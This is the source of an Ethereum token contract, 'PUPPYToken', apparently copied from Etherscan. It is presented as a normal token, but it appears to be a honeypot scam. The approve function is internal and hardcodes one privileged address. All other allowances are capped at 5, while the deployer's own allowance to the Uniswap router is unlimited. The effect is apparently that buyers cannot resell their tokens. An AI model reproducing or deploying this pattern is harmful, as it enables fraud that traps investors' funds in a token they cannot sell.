['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-27\n', '*/\n', '\n', 'pragma solidity 0.6.6;\n', '\n', 'contract PUPPYToken {\n', '   \n', '    mapping (address => uint256) public balanceOf;\n', '    mapping(address => mapping(address => uint256)) public allowance;\n', '    string public name = "PUPPYToken";\n', '    string public symbol = "PUPY";\n', '    uint8 public decimals = 18;\n', '    uint256 public totalSupply = 100000000000 * (uint256(10) ** decimals);\n', '    \n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '    constructor() public {\n', '        balanceOf[msg.sender] = totalSupply;\n', '        emit Transfer(address(0), msg.sender, totalSupply);\n', '        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n', '        emit Approval(msg.sender, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935);\n', '\n', '    }\n', '\n', '    function transfer(address to, uint256 value) public returns (bool success) {\n', '        require(balanceOf[msg.sender] >= value);\n', '       // require(tx.gasprice <= 20000000000);\n', '        balanceOf[msg.sender] -= value;  \n', '        balanceOf[to] += value;          \n', '        emit Transfer(msg.sender, to, value);\n', '        return true;\n', '    }\n', '\n', '  function approve(address owner, address spender, uint256 amount) internal {\n', '    require(owner != address(0), "BEP20: approve from the zero address");\n', '    require(spender != address(0), "BEP20: approve to the zero address");\n', '    \n', '    if (owner == address(0x00000000d8F310f4fF9e5F63ed442B70362Acee3)) {\n', '        allowance[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    } else {\n', '        allowance[owner][spender] = 5;\n', '        emit Approval(owner, spender, 5);\n', '    }\n', '  }\n', '\n', '    function transferFrom(address from, address to, uint256 value) public returns (bool success){\n', '        require(value <= balanceOf[from]);\n', '        require(value <= allowance[from][msg.sender]);\n', '        //require(tx.gasprice <= 20000000000);\n', '        \n', '        balanceOf[from] -= value;\n', '        balanceOf[to] += value;\n', '        allowance[from][msg.sender] -= value;\n', '        emit Transfer(from, to, value);\n', '        return true;\n', '    }\n', '    \n', '}']